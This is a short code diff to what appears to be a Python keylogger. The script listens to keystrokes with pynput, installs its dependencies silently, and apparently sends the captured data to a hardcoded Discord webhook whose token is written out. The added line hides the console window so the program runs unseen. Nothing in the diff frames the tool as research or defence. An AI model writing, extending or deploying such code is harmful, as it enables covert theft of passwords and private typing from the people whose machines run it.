@@ -1,5 +1,6 @@
 webhook_url = "https://discordapp.com/api/webhooks/1445378180230676532/xM9EEoIkHmFc1D0vyWNamVN4l7VjEr7Wl5J5QviV2dn2T2uZL24DLjnxSntX8qX7sFbZ"
 
+import ctypes; ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 import os
 try:
     os.system("pip install pynput requests")
@@ -57,4 +58,5 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     send_data()
     listener.join()
+
 
